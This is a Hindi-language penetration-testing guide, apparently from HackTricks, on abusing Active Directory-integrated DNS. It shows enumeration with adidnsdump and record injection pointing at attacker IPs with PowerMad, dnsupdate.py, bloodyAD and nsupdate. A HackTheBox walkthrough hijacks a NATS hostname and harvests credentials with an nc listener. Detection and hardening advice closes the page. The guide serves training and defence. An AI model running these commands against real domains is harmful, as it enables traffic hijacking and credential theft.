# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

डिफ़ॉल्ट रूप से, Active Directory में **कोई भी user** Domain या Forest DNS zones के **सभी DNS records enumerate** कर सकता है, जो zone transfer के समान है (users, AD environment में DNS zone के child objects की सूची देख सकते हैं)।

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) tool, internal networks की recon के उद्देश्य से zone के **सभी DNS records enumerate** और **export** करने की सुविधा देता है।<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (April 2025) JSON/Greppable (`--json`) output, multi-threaded DNS resolution और LDAPS से bind करते समय TLS 1.2/1.3 के लिए support जोड़ता है  

अधिक जानकारी के लिए [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/) पढ़ें<sup>[[4]](#references)</sup>

---

## रिकॉर्ड बनाना / संशोधित करना (ADIDNS spoofing)

क्योंकि **Authenticated Users** group के पास default रूप से zone DACL पर **Create Child** permission होती है, इसलिए कोई भी domain account (या computer account) अतिरिक्त records register कर सकता है। इसका इस्तेमाल traffic hijacking, NTLM relay coercion या यहाँ तक कि पूरे domain पर नियंत्रण पाने के लिए किया जा सकता है।

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py Impacket ≥0.12.0 के साथ आता है)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## सामान्य attack primitives

1. **Wildcard record** – `*.<zone>` AD DNS server को LLMNR/NBNS spoofing जैसा पूरे enterprise में जवाब देने वाला responder बना देता है। इसका दुरुपयोग NTLM hashes capture करने या उन्हें LDAP/SMB तक relay करने के लिए किया जा सकता है। (इसके लिए WINS-lookup बंद होना आवश्यक है।)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – credentials हासिल करने के लिए `wpad` जोड़ें (या Global-Query-Block-List को bypass करने के लिए attacker host की ओर इंगित करने वाला **NS** record जोड़ें) और outbound HTTP requests को पारदर्शी रूप से proxy करें। Microsoft ने wildcard/DNAME bypasses को patch किया (CVE-2018-8320), लेकिन **NS-records अब भी काम करते हैं**।<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – उस IP address पर कब्ज़ा करें जो पहले किसी workstation का था; उससे जुड़ा DNS entry अब भी resolve होगा। इससे DNS को छुए बिना resource-based constrained delegation या Shadow-Credentials attacks संभव होते हैं।    
4. **DHCP → DNS spoofing** – default Windows DHCP+DNS deployment में, उसी subnet पर मौजूद unauthenticated attacker forged DHCP requests भेजकर किसी भी मौजूदा A record (Domain Controllers समेत) को overwrite कर सकता है; ये requests dynamic DNS updates trigger करती हैं (Akamai “DDSpoof”, 2023)। इससे Kerberos/LDAP पर machine-in-the-middle संभव होता है और पूरा domain takeover हो सकता है।<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – अपने नियंत्रण वाले machine account का `dNSHostName` बदलें, उससे मेल खाता A record register करें, फिर उस नाम के लिए certificate माँगकर DC का रूप धारण करें। **Certipy** या **BloodyAD** जैसे tools इस पूरी प्रक्रिया को automate करते हैं।  

[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) वाला AD DNS record conditional relay chain का हिस्सा बन सकता है: caller के पास record बनाने के अधिकार, ऐसी coercion path की ज़रूरत होती है जो target computer से उस नाम पर authenticate करवाए, और ऐसे relay destination की भी जो उस authentication को स्वीकार करे। Destination protocol का अलग से आकलन करें; incoming connection पर SMB signing होने से अपने-आप यह तय नहीं होता कि HTTPS WinRM destination relay स्वीकार करेगा या नहीं। Patch level, name handling, Extended Protection और service configuration से परिणाम बदल सकता है।

---

### Stale dynamic records के ज़रिए internal service hijacking (NATS case study)

जब dynamic updates सभी authenticated users के लिए खुले रहते हैं, **तो हटाए गए service name पर फिर से दावा करके उसे attacker infrastructure की ओर point किया जा सकता है**। Mirage HTB DC पर DNS scavenging के बाद `nats-svc.mirage.htb` hostname उपलब्ध था, इसलिए कोई भी low-privileged user यह कर सकता था:<sup>[[3]](#references)</sup>

1. `dig` से **पुष्टि करें कि record मौजूद नहीं है** और SOA पता करें:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **रिकॉर्ड को फिर से बनाएं** उस external/VPN interface की ओर जिसे वे नियंत्रित करते हैं:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **plaintext service का प्रतिरूपण करें**। NATS clients credentials भेजने से पहले एक `INFO { ... }` banner देखने की अपेक्षा करते हैं, इसलिए असली broker से एक वैध banner कॉपी करना secrets हासिल करने के लिए पर्याप्त है:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

किसी भी client द्वारा hijacked name resolve करने पर उसका JSON `CONNECT` frame (जिसमें `"user"`/`"pass"` शामिल हैं) तुरंत listener को leak हो जाएगा। Attacker host पर official `nats-server -V` binary चलाने, उसके log redaction को disable करने या Wireshark से session को sniff करने पर वही plaintext credentials मिलते हैं, क्योंकि TLS optional था।

4. **captured creds के साथ pivot करें** – Mirage में चुराए गए NATS account से JetStream access मिला, जिससे पुराने authentication events सामने आए जिनमें दोबारा इस्तेमाल किए जा सकने वाले AD usernames/passwords थे।

यह pattern हर उस AD-integrated service पर लागू होता है जो unsecured TCP handshakes (HTTP APIs, RPC, MQTT आदि) पर निर्भर करती है: DNS record hijack होने के बाद attacker ही service बन जाता है।

---

## Detection & hardening

* Sensitive zones पर **Authenticated Users** को *Create all child objects* का अधिकार न दें और dynamic updates को DHCP द्वारा इस्तेमाल किए जाने वाले dedicated account को delegate करें।
* यदि dynamic updates आवश्यक हों, तो zone को **Secure-only** पर सेट करें और DHCP में **Name Protection** enable करें, ताकि केवल owner computer object ही अपना record overwrite कर सके।
* DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) और `CN=MicrosoftDNS,DC=DomainDnsZones` में LDAP writes को monitor करें।
* खतरनाक names (`wpad`, `isatap`, `*`) को जानबूझकर benign record या Global Query Block List के ज़रिए block करें।
* DNS servers को patched रखें – उदाहरण के लिए, RCE bugs CVE-2024-26224 और CVE-2024-26231 का **CVSS 9.8** score था और वे Domain Controllers के विरुद्ध remotely exploitable हैं।

## References

- [1] [ADIDNS पर दोबारा नज़र - WPAD, GQBL और अन्य](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DHCP DNS Dynamic Updates का दुरुपयोग करके DNS Records spoof करना](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: NFS Leaks को chain करना, Dynamic DNS का दुरुपयोग, NATS Credential Theft, JetStream Secrets और Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Zone में प्रवेश: adidnsdump का उपयोग करके Active Directory DNS dump करना](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
